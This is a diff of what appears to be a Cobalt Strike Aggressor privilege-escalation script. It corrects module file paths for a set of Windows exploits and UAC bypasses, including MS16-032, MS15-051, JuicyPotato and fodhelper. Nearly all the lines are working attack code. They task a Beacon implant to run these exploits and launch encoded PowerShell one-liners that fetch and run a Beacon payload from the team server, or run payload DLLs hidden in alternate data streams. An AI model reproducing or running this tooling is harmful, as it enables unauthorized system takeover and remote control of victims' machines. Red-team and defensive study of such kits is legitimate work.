@@ -16,7 +16,7 @@ sub ms16_032_exploit {
 	$oneliner = beacon_host_script($1, $script);
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, script_resource("elevate/modulesInvoke-MS16032.ps1"));
+	bpowershell_import!($1, script_resource("elevate/modules/Invoke-MS16032.ps1"));
 	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
 
 	# give it another 10s to work.
@@ -42,7 +42,7 @@ sub eventvwr_exploit {
 	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, script_resource("elevate/modulesInvoke-EventVwrBypass.ps1"));
+	bpowershell_import!($1, script_resource("elevate/modules/Invoke-EventVwrBypass.ps1"));
 	bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $oneliner $+ \"");
 
 	# handle staging
@@ -65,7 +65,7 @@ sub wscript_exploit {
 	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, script_resource("elevate/modulesInvoke-WScriptBypassUAC.ps1"));
+	bpowershell_import!($1, script_resource("elevate/modules/Invoke-WScriptBypassUAC.ps1"));
 	bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $oneliner $+ \"");
 
 	# handle staging
@@ -84,11 +84,11 @@ sub ms15_051_exploit {
 	# tune our parameters based on the target arch
 	if (-is64 $1) {
 		$arch   = "x64";
-		$dll    = script_resource("elevate/modulescve-2015-1701.x64.dll");
+		$dll    = script_resource("elevate/modules/cve-2015-1701.x64.dll");
 	}
 	else {
 		$arch   = "x86";
-		$dll    = script_resource("elevate/modulescve-2015-1701.x86.dll");
+		$dll    = script_resource("elevate/modules/cve-2015-1701.x86.dll");
 	}
 
 	# generate our shellcode
@@ -126,7 +126,7 @@ sub ms16_016_exploit {
 	$stager = shellcode($2, false, "x86");
 
 	# spawn a Beacon post-ex job with the exploit DLL
-	bdllspawn!($1, script_resource("elevate/modulescve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+	bdllspawn!($1, script_resource("elevate/modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
 
 	# stage our payload (if this is a bind payload)
 	bstage($1, $null, $2, $arch);
@@ -154,7 +154,7 @@ sub slui_exploit {
 	bupload_raw($1, "C:\\Users\\" . $user . ":temp.dll", $payload);
 
 	# Task beacon to run exploit with rundll32 and the path to the dll
-	bpowershell_import!($1, script_resource("elevate/modulesFilelessUACBypass.ps1"));
+	bpowershell_import!($1, script_resource("elevate/modules/FilelessUACBypass.ps1"));
 	bpowerpick!($1, "Invoke-SluiBypass -Command 'rundll32.exe C:\\Users\\" . $user . ":temp.dll,Start'");
 
 	#handle staging
@@ -186,7 +186,7 @@ sub fodhelper_exploit {
 	bupload_raw($1, "C:\\Users\\" . $user . ":temp.dll", $payload);
 
 	# Task beacon to run exploit with rundll32 and the path to the dll
-	bpowershell_import!($1, script_resource("elevate/modulesFilelessUACBypass.ps1"));
+	bpowershell_import!($1, script_resource("elevate/modules/FilelessUACBypass.ps1"));
 	bpowerpick!($1, "Invoke-FodhelperBypass -Command 'rundll32.exe C:\\Users\\" . $user . ":temp.dll,Start'");
 
 	#handle staging
@@ -235,7 +235,7 @@ sub tokenmagic_exploit {
     $oneliner = powershell_encode_oneliner(beacon_host_script($1, $script));
 
     # run the exploit
-    bpowershell_import!($1, script_resource("elevate/modulesUAC-TokenMagic.ps1"));
+    bpowershell_import!($1, script_resource("elevate/modules/UAC-TokenMagic.ps1"));
     bpowerpick!($1, 'UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c ' . $oneliner . '"');
 
     # handle staging
@@ -253,7 +253,7 @@ alias audit_uac {
 	$oneliner = powershell_encode_oneliner(beacon_host_script($1, $script));
 
 	# Task beacon to run exploit with oneliner that runs Beacon
-	bpowershell_import!($1, script_resource("elevate/modulesFilelessUACBypass.ps1"));
+	bpowershell_import!($1, script_resource("elevate/modules/FilelessUACBypass.ps1"));
 	bpowerpick!($1, "Test-UAC");
 
 }
@@ -268,10 +268,10 @@ sub rottenpotato {
     if (-is64 $1)
     {
         $arch = "x64";
-        $dll = script_resource("elevate/modulespotato.x64.dll");
+        $dll = script_resource("elevate/modules/potato.x64.dll");
     } else {
         $arch = "x86";
-        $dll = script_resource("elevate/modulespotato.x86.dll");
+        $dll = script_resource("elevate/modules/potato.x86.dll");
     }
 
     $stager = shellcode($2, false, $arch);
@@ -289,10 +289,10 @@ sub juicypotato {
     if (-is64 $1)
     {
         $arch = "x64";
-        $dll = script_resource("elevate/modulesJuicyPotato.x64.dll");
+        $dll = script_resource("elevate/modules/JuicyPotato.x64.dll");
     } else {
         $arch = "x86";
-        $dll = script_resource("elevate/modulesJuicyPotato.x86.dll");
+        $dll = script_resource("elevate/modules/JuicyPotato.x86.dll");
     }
 
     $stager = shellcode($2, false, $arch);
@@ -318,7 +318,7 @@ sub ms16_135 {
 	$oneliner = beacon_host_script($1, $script);
 
 	# Source
-	$source = getFileProper(script_resource("elevate\\modules"), "Invoke-MS16135.ps1");
+	$source = getFileProper(script_resource("elevate/modules/"), "Invoke-MS16135.ps1");
 
 	# Import & run
 	bpowershell_import!($1, $source);
@@ -356,7 +356,7 @@ sub silentcleanup_exploit {
 	bupload_raw($1, "C:\\Users\\" . $user . "\\temp.dll", $payload);
 
 	# Task beacon to run exploit with the path to the dll
-	bexecute_assembly($1, script_resource("elevate/modulesuac_bypass_silentcleanup.exe"), "c:\\users\\" . $user . "\\temp.dll,Start");
+	bexecute_assembly($1, script_resource("elevate/modules/uac_bypass_silentcleanup.exe"), "c:\\users\\" . $user . "\\temp.dll,Start");
 
 	# Handle staging for named pipe beacons
 	bstage($1, $null, $2, $arch);
